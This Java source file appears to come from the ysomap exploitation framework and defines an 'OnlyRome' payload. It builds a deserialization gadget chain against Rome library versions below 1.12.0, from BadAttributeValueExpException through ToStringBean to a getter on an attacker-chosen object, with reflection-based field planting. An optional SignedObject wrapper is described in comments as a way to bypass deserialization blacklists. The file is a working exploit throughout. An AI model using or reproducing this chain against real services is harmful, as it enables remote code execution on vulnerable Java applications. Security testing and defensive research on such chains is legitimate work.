package ysomap.payloads.java.rome;

import com.alibaba.fastjson.JSONObject;
import com.fasterxml.jackson.databind.node.POJONode;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.functors.ConstantTransformer;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LdapAttributeBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;
import ysomap.payloads.Payload;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;
import java.util.Objects;

/**
 * @author whocansee
 * @since 2023/10/7
 * Rome链因其特殊序列化逻辑，可以使用JdbcBullet而不能使用LDAPBullet
 * 添加了obj instanceof TemplatesImpl判断，以在使用TemplatesImplBullet的时候稳定触发Rome链
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.whocansee })
@Targets({Targets.JDK})
@Require(bullets = {"JdbcRowSetImplBullet", "TemplatesImplBullet"}, param = false)
@Dependencies({"Rome < 1.12.0"})
@Details("BadAttributeValueExpException.readObject->ToStringBean.toString->bullet对象的getter方法")
public class OnlyRome extends AbstractPayload<Object> {
    @Require(name = "wrapped", detail = "是否使用SignedObject进行二次反序列化（用以绕过反序列化黑名单）" +
            "默认不使用，填true表示启用")
    private Boolean wrapped = false;

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return LdapAttributeBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Object obj1 = getterGadget(obj);
        if (wrapped) {
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
            kpg.initialize(1024);
            KeyPair kp = kpg.generateKeyPair();
            SignedObject signedObject = new SignedObject((Serializable) obj1, kp.getPrivate(), Signature.getInstance("DSA"));
            return PayloadHelper.makeReadObjectToStringTrigger(getterGadget(signedObject));
        } else {
            return PayloadHelper.makeReadObjectToStringTrigger(obj1);
        }
    }
    public Object getterGadget(Object obj) throws Exception {
        Object stringBean = null;
        Class<?> type = obj.getClass();
        if(obj instanceof TemplatesImpl){stringBean = makeStringBean(Templates.class, new ConstantTransformer(1));}
        else{stringBean = makeStringBean(type, new ConstantTransformer(1));}
        Object equalsBean = makeEqualsBean(makeStringBeanClass(),stringBean);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(equalsBean,"123");
        try{
            // for rome 1.11.1
            Field field = stringBean.getClass().getDeclaredField("obj");
            field.setAccessible(true);
            field.set(stringBean,obj);
        }catch (Exception e){
            // for rome 1.0
            Field field = stringBean.getClass().getDeclaredField("_obj");
            field.setAccessible(true);
            field.set(stringBean,obj);
        }
        return hashMap;
    }
    public Class<?> makeStringBeanClass() throws ClassNotFoundException {
        Class cls = null;
        try{
            // for rome 1.0
            cls = Class.forName("com.sun.syndication.feed.impl.ToStringBean");
        }catch (Exception e){
            // for rome 1.11.1
            cls = Class.forName("com.rometools.rome.feed.impl.ToStringBean");
        }
        return cls;
    }

    public Object makeStringBean(Class<?> type, Object obj) throws Exception {
        Object stringBean = null;
        try{
            // for rome 1.0
            stringBean = ReflectionHelper.newInstance("com.sun.syndication.feed.impl.ToStringBean", new Class[]{Class.class, Object.class}, type, obj);
        }catch (Exception e){
            // for rome 1.11.1
            stringBean = ReflectionHelper.newInstance("com.rometools.rome.feed.impl.ToStringBean", new Class[]{Class.class, Object.class}, type, obj);
        }
        return stringBean;
    }

    public Object makeEqualsBean(Class<?> type, Object obj) throws Exception {
        Object equalsBean = null;
        try{
            // for rome 1.0
            equalsBean = ReflectionHelper.newInstance("com.sun.syndication.feed.impl.EqualsBean", new Class[]{Class.class, Object.class}, type, obj);
        }catch (Exception e){
            // for rome 1.11.1
            equalsBean = ReflectionHelper.newInstance("com.rometools.rome.feed.impl.EqualsBean", new Class[]{Class.class, Object.class}, type, obj);
        }
        return equalsBean;
    }

}